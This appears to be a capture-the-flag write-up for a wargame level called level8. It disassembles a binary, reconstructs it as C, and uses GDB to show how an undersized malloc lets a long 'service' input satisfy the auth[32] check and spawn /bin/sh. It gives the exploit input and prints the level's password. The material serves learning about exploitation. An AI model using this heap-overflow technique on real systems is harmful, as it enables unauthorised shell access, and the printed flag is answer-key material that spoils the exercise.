## level8
Below is an objdump of the program

```
08048564 <main>:
 8048564:       55                      push   ebp
 8048565:       89 e5                   mov    ebp,esp
 8048567:       57                      push   edi
 8048568:       56                      push   esi
 8048569:       83 e4 f0                and    esp,0xfffffff0
 804856c:       81 ec a0 00 00 00       sub    esp,0xa0
 8048572:       eb 01                   jmp    8048575 <main+0x11>
 8048574:       90                      nop
 8048575:       8b 0d b0 9a 04 08       mov    ecx,DWORD PTR ds:0x8049ab0
 804857b:       8b 15 ac 9a 04 08       mov    edx,DWORD PTR ds:0x8049aac
 8048581:       b8 10 88 04 08          mov    eax,0x8048810
 8048586:       89 4c 24 08             mov    DWORD PTR [esp+0x8],ecx
 804858a:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 804858e:       89 04 24                mov    DWORD PTR [esp],eax
 8048591:       e8 7a fe ff ff          call   8048410 <printf@plt>
 8048596:       a1 80 9a 04 08          mov    eax,ds:0x8049a80
 804859b:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 804859f:       c7 44 24 04 80 00 00    mov    DWORD PTR [esp+0x4],0x80
 80485a6:       00
 80485a7:       8d 44 24 20             lea    eax,[esp+0x20]
 80485ab:       89 04 24                mov    DWORD PTR [esp],eax
 80485ae:       e8 8d fe ff ff          call   8048440 <fgets@plt>
 80485b3:       85 c0                   test   eax,eax
 80485b5:       0f 84 71 01 00 00       je     804872c <main+0x1c8>
 80485bb:       8d 44 24 20             lea    eax,[esp+0x20]
 80485bf:       89 c2                   mov    edx,eax
 80485c1:       b8 19 88 04 08          mov    eax,0x8048819
 80485c6:       b9 05 00 00 00          mov    ecx,0x5
 80485cb:       89 d6                   mov    esi,edx
 80485cd:       89 c7                   mov    edi,eax
 80485cf:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 80485d1:       0f 97 c2                seta   dl
 80485d4:       0f 92 c0                setb   al
 80485d7:       89 d1                   mov    ecx,edx
 80485d9:       28 c1                   sub    cl,al
 80485db:       89 c8                   mov    eax,ecx
 80485dd:       0f be c0                movsx  eax,al
 80485e0:       85 c0                   test   eax,eax
 80485e2:       75 5e                   jne    8048642 <main+0xde>
 80485e4:       c7 04 24 04 00 00 00    mov    DWORD PTR [esp],0x4
 80485eb:       e8 80 fe ff ff          call   8048470 <malloc@plt>
 80485f0:       a3 ac 9a 04 08          mov    ds:0x8049aac,eax
 80485f5:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
 80485fa:       c7 00 00 00 00 00       mov    DWORD PTR [eax],0x0
 8048600:       8d 44 24 20             lea    eax,[esp+0x20]
 8048604:       83 c0 05                add    eax,0x5
 8048607:       c7 44 24 1c ff ff ff    mov    DWORD PTR [esp+0x1c],0xffffffff
 804860e:       ff
 804860f:       89 c2                   mov    edx,eax
 8048611:       b8 00 00 00 00          mov    eax,0x0
 8048616:       8b 4c 24 1c             mov    ecx,DWORD PTR [esp+0x1c]
 804861a:       89 d7                   mov    edi,edx
 804861c:       f2 ae                   repnz scas al,BYTE PTR es:[edi]
 804861e:       89 c8                   mov    eax,ecx
 8048620:       f7 d0                   not    eax
 8048622:       83 e8 01                sub    eax,0x1
 8048625:       83 f8 1e                cmp    eax,0x1e
 8048628:       77 18                   ja     8048642 <main+0xde>
 804862a:       8d 44 24 20             lea    eax,[esp+0x20]
 804862e:       8d 50 05                lea    edx,[eax+0x5]
 8048631:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
 8048636:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 804863a:       89 04 24                mov    DWORD PTR [esp],eax
 804863d:       e8 1e fe ff ff          call   8048460 <strcpy@plt>
 8048642:       8d 44 24 20             lea    eax,[esp+0x20]
 8048646:       89 c2                   mov    edx,eax
 8048648:       b8 1f 88 04 08          mov    eax,0x804881f
 804864d:       b9 05 00 00 00          mov    ecx,0x5
 8048652:       89 d6                   mov    esi,edx
 8048654:       89 c7                   mov    edi,eax
 8048656:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 8048658:       0f 97 c2                seta   dl
 804865b:       0f 92 c0                setb   al
 804865e:       89 d1                   mov    ecx,edx
 8048660:       28 c1                   sub    cl,al
 8048662:       89 c8                   mov    eax,ecx
 8048664:       0f be c0                movsx  eax,al
 8048667:       85 c0                   test   eax,eax
 8048669:       75 0d                   jne    8048678 <main+0x114>
 804866b:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
 8048670:       89 04 24                mov    DWORD PTR [esp],eax
 8048673:       e8 a8 fd ff ff          call   8048420 <free@plt>
 8048678:       8d 44 24 20             lea    eax,[esp+0x20]
 804867c:       89 c2                   mov    edx,eax
 804867e:       b8 25 88 04 08          mov    eax,0x8048825
 8048683:       b9 06 00 00 00          mov    ecx,0x6
 8048688:       89 d6                   mov    esi,edx
 804868a:       89 c7                   mov    edi,eax
 804868c:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 804868e:       0f 97 c2                seta   dl
 8048691:       0f 92 c0                setb   al
 8048694:       89 d1                   mov    ecx,edx
 8048696:       28 c1                   sub    cl,al
 8048698:       89 c8                   mov    eax,ecx
 804869a:       0f be c0                movsx  eax,al
 804869d:       85 c0                   test   eax,eax
 804869f:       75 14                   jne    80486b5 <main+0x151>
 80486a1:       8d 44 24 20             lea    eax,[esp+0x20]
 80486a5:       83 c0 07                add    eax,0x7
 80486a8:       89 04 24                mov    DWORD PTR [esp],eax
 80486ab:       e8 80 fd ff ff          call   8048430 <strdup@plt>
 80486b0:       a3 b0 9a 04 08          mov    ds:0x8049ab0,eax
 80486b5:       8d 44 24 20             lea    eax,[esp+0x20]
 80486b9:       89 c2                   mov    edx,eax
 80486bb:       b8 2d 88 04 08          mov    eax,0x804882d
 80486c0:       b9 05 00 00 00          mov    ecx,0x5
 80486c5:       89 d6                   mov    esi,edx
 80486c7:       89 c7                   mov    edi,eax
 80486c9:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 80486cb:       0f 97 c2                seta   dl
 80486ce:       0f 92 c0                setb   al
 80486d1:       89 d1                   mov    ecx,edx
 80486d3:       28 c1                   sub    cl,al
 80486d5:       89 c8                   mov    eax,ecx
 80486d7:       0f be c0                movsx  eax,al
 80486da:       85 c0                   test   eax,eax
 80486dc:       0f 85 92 fe ff ff       jne    8048574 <main+0x10>
 80486e2:       a1 ac 9a 04 08          mov    eax,ds:0x8049aac
 80486e7:       8b 40 20                mov    eax,DWORD PTR [eax+0x20]
 80486ea:       85 c0                   test   eax,eax
 80486ec:       74 11                   je     80486ff <main+0x19b>
 80486ee:       c7 04 24 33 88 04 08    mov    DWORD PTR [esp],0x8048833
 80486f5:       e8 86 fd ff ff          call   8048480 <system@plt>
 80486fa:       e9 75 fe ff ff          jmp    8048574 <main+0x10>
 80486ff:       a1 a0 9a 04 08          mov    eax,ds:0x8049aa0
 8048704:       89 c2                   mov    edx,eax
 8048706:       b8 3b 88 04 08          mov    eax,0x804883b
 804870b:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
 804870f:       c7 44 24 08 0a 00 00    mov    DWORD PTR [esp+0x8],0xa
 8048716:       00
 8048717:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 804871e:       00
 804871f:       89 04 24                mov    DWORD PTR [esp],eax
 8048722:       e8 29 fd ff ff          call   8048450 <fwrite@plt>
 8048727:       e9 48 fe ff ff          jmp    8048574 <main+0x10>
 804872c:       90                      nop
 804872d:       b8 00 00 00 00          mov    eax,0x0
 8048732:       8d 65 f8                lea    esp,[ebp-0x8]
 8048735:       5e                      pop    esi
 8048736:       5f                      pop    edi
 8048737:       5d                      pop    ebp
 8048738:       c3                      ret
 8048739:       90                      nop
 804873a:       90                      nop
 804873b:       90                      nop
 804873c:       90                      nop
 804873d:       90                      nop
 804873e:       90                      nop
 804873f:       90                      nop
 ```

I learnt a new instruction `repnz scas al,BYTE PTR es:[edi]`. This instruction is a combination of repnz and scas prefixes. The repnz will repeat an instruction, on our case is scas, until a zero value is found. the scan instruction scans a string and it comparaes the value in al with the value in ES:[EDI] and updates the flags according to results.

This is mainly used to record the ecx value used by repnz, to get the string length.

The pseudo-code looks like this
```clike=
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


char	*auth = NULL;
char	*service = NULL;

int    main()
{
    char    fgets_buf[129];

    while (1)
    {
        // 8048591
        printf("%p, %p \n", auth, service);	

        // 80485ae
        if (fgets(fgets_buf, 128, stdin) == NULL)
            break;

        // 80485cf        
        if (strncmp(fgets_buf, "auth ", 5) == 0)
        {
            // 80485eb
            auth = malloc(4);
            
            // 80485fa
            auth[0] = '\0';
            
            // 804861c
            if (strlen(fgets_buf - 5 - 1) > 30)
                continue;
            
            // 804863d
            strcpy(auth, fgets_buf + 5);
        }

        // 8048656
        if (strncmp(fgets_buf, "reset", 5) == 0)
            free(auth); // 8048673

        // 804868c
        if (strncmp(fgets_buf, "service", 6) == 0)
            service = strdup(fgets_buf + 7); // 80486ab

        // 80486c9
        if (strncmp(fgets_buf, "login", 5) == 0)
        {
            // 80486e7
            if (auth[32] != '\0')
                system("/bin/sh"); // 80486f5
            else
                 fwrite("Password:\n", 1, 10, stdout); // 8048722
        }
    }
    return 0;
}
```
Looks like there isnt any obvious vulns right off the bat, however I do see we need to somehow overwrite the boundaries of auth, which is possible, because `80485eb` only malloced 4 bytes for the pointer but the strcpy can go up to 32 bytes. The only thing I see is possible is to somehow make the `strdup` from service to write memory next to auths 4 byte size.

Here are the observations I obtained from GDB. As we can see, from the first iteration, the layout of the variables in the data section and they are located 4 bytes from each other by default.
![image](https://hackmd.io/_uploads/rkfGQr1Ua.png)

After the first auth input, the `auth` variable now stores an address, `0x0804a008`.
![image](https://hackmd.io/_uploads/BJd-NS1I6.png)

As we can see, the address should yield our input, `BBCC`
![image](https://hackmd.io/_uploads/HysGIByUa.png)

At our second iteration, our service command starts filling up the space below
![image](https://hackmd.io/_uploads/SJcvLByLp.png)

As we can see, we already classify for the login shell, when our input for service is 121 characters long
![image](https://hackmd.io/_uploads/SJ_JwSJLp.png)

I tried going over 127 charactersm but by right it shouldnt overwrite auth because the malloced space is 4.
![image](https://hackmd.io/_uploads/S10qvByUT.png)

The input I used for this is 
```
auth BBCC
service ADASDASDASDAdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

The programming mistake here is that the malloc is too small, we should malloc at least 32 for auth instead if we want to read it later on. The password is like so `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
![image](https://hackmd.io/_uploads/rk2JuByUp.png)

